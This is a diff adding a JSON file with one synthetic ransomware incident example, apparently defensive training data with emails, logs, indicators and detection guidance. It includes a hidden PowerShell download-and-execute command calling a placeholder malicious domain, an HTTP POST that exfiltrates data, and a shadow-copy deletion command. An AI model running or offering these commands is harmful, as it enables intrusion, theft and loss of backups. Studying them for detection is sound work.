@@ -1,0 +1,69 @@
+{
+  "examples": [
+    {
+      "scenario": "Double extortion ransomware attack where attackers gained initial access via phishing, deployed ransomware that encrypted files, and simultaneously exfiltrated sensitive data over a covert HTTPS channel with data exfiltration detected in network logs. The attacker used a custom PowerShell loader to run ransomware and exfiltrate data via HTTP POST requests to a C2 server under the guise of legitimate traffic.",
+      "technical_data": {
+        "email_phishing": {
+          "raw_email_headers": "Return-Path: <spoofed-sender@trustedcorp.com>\r\nReceived: from mail.trustedcorp.com (mail.trustedcorp.com [192.168.10.5])\r\n\tby victim-mailserver.corp.local (Postfix) with ESMTPS id 3D7F1284A2\r\n\tfor <victim@company.com>; Tue, 21 Mar 2023 14:22:33 +0000 (UTC)\r\nReceived-SPF: pass (company.com: domain of trustedcorp.com designates 192.168.10.5 as permitted sender)\r\nAuthentication-Results: victim-mailserver.corp.local; spf=pass smtp.mailfrom=trustedcorp.com; dkim=pass header.d=trustedcorp.com; dmarc=pass\r\nFrom: \"Trusted Corp Support\" <support@trustedcorp.com>\r\nTo: victim@company.com\r\nSubject: Urgent: Security Update Required\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_NextPart_000_0012_01D9B7F0.8B2B64C0\"",
+          "email_body_excerpt": "------=_NextPart_000_0012_01D9B7F0.8B2B64C0\r\nContent-Type: text/html; charset=\"utf-8\"\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n<p>Dear User,</p>\r\n<p>Please review the attached security update and run the script to patch your system immediately to\r\navoid service disruption.</p>\r\n<p><a href=\"http://malicious-domain[.]com/update.ps1\">Download Update</a></p>\r\n------=_NextPart_000_0012_01D9B7F0.8B2B64C0--",
+          "smtp_transaction_log": "220 mail.trustedcorp.com ESMTP Postfix\r\nEHLO victim-mailserver.corp.local\r\n250-mail.trustedcorp.com\r\n250-PIPELINING\r\n250-SIZE 52428800\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<spoofed-sender@trustedcorp.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<victim@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[DATA OMITTED]\r\n.\r\n250 2.0.0 Ok: queued as 3D7F1284A2"
+        },
+        "powershell_loader_script": "powershell -nop -w hidden -c \"$client = New-Object System.Net.WebClient; $script = $client.DownloadString('http://malicious-domain.com/payload.ps1'); Invoke-Expression $script\"",
+        "ransomware_file_hashes": {
+          "MD5": "e4b7c2d3f7a3a18a8d9f7c5a6b1e3f6d",
+          "SHA-1": "a57b9f8d3e2b1a4c5d7f9e8c6b3a2d1f7e9c4b2a",
+          "SHA-256": "d4c3b2a1f8e7d6c5b4a3928176f5e4d3c2b1a0f9e8d7c6b5a49382716f5e4d3c"
+        },
+        "file_system_artifacts": [
+          "C:\\Users\\victim\\Documents\\encrypted\\README_DECRYPT.txt",
+          "C:\\Windows\\Temp\\ransom_payload.exe",
+          "Registry key created: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysUpdate = C:\\Windows\\Temp\\ransom_payload.exe"
+        ],
+        "network_packet_capture_excerpt": "Frame 42: 1514 bytes on wire (12112 bits), 1514 bytes captured (12112 bits) on interface 0\nEthernet II, Src: 00:0c:29:3e:5b:7a, Dst: 00:50:56:c0:00:08\nInternet Protocol Version 4, Src: 192.168.1.45, Dst: 198.51.100.23\nTransmission Control Protocol, Src Port: 49152, Dst Port: 443, Seq: 1, Ack: 1, Len: 1460\nHypertext Transfer Protocol\n    POST /api/v1/data/upload HTTP/1.1\r\n    Host: api.malicious-domain.com\r\n    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n    Content-Type: application/octet-stream\r\n    Content-Length: 1450\r\n\r\n[binary data stream, base64-encoded exfiltrated sensitive files]",
+        "http_post_exfiltration_sample": "POST /api/v1/data/upload HTTP/1.1\r\nHost: api.malicious-domain.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nContent-Type: application/octet-stream\r\nContent-Length: 2048\r\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\r\n\r\nVGhpcyBpcyBhbiBleGZpbHRyYXRpb24gb2Ygc2Vuc2l0aXZlIGZpbGUgY29udGVudHMgYmFzZTY0IGVuY29kZWQu",
+        "process_creation_chain": [
+          "svchost.exe -> powershell.exe -nop -w hidden -c ...",
+          "powershell.exe -> ransomware_payload.exe",
+          "ransomware_payload.exe -> cmd.exe /c vssadmin delete shadows /all /quiet"
+        ],
+        "security_logs": [
+          "2023-03-21T14:25:37Z Security Event ID 4688: New Process Created: Creator Process Name: svchost.exe, Process Name: powershell.exe, Command Line: powershell -nop -w hidden -c \"$client = New-Object System.Net.WebClient; $script = $client.DownloadString('http://malicious-domain.com/payload.ps1'); Invoke-Expression $script\"",
+          "2023-03-21T14:28:15Z Windows Defender: Detected ransomware behavior: file encryption started in C:\\Users\\victim\\Documents\\encrypted",
+          "2023-03-21T14:30:02Z Network IDS: Alert - Suspicious POST data to api.malicious-domain.com on port 443"
+        ]
+      },
+      "indicators": {
+        "malicious_domains": [
+          "malicious-domain.com",
+          "api.malicious-domain.com"
+        ],
+        "file_hashes": [
+          "e4b7c2d3f7a3a18a8d9f7c5a6b1e3f6d",
+          "a57b9f8d3e2b1a4c5d7f9e8c6b3a2d1f7e9c4b2a",
+          "d4c3b2a1f8e7d6c5b4a3928176f5e4d3c2b1a0f9e8d7c6b5a49382716f5e4d3c"
+        ],
+        "registry_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysUpdate"
+        ],
+        "smtp_senders": [
+          "spoofed-sender@trustedcorp.com"
+        ],
+        "processes": [
+          "powershell.exe",
+          "ransomware_payload.exe",
+          "cmd.exe"
+        ]
+      },
+      "detection_method": "Detect phishing emails using SPF, DKIM, and DMARC failures combined with email header analysis and URL reputation checks. Monitor process creation logging for unusual PowerShell execution with network download commands. Use Endpoint Detection and Response (EDR) tools to detect ransomware file encryption behavior and deletion of shadow copies through suspicious command line arguments. Network IDS/IPS to detect large outbound POST requests with anomalous payloads over HTTPS to uncommon domains. Deploy DLP solutions to identify sensitive data leaving the network over unexpected channels.",
+      "relevant_mitre_techniques": [
+        "T1566.001",
+        "T1059.001",
+        "T1486",
+        "T1041",
+        "T1071.001",
+        "T1490",
+        "T1005"
+      ]
+    }
+  ]
+}
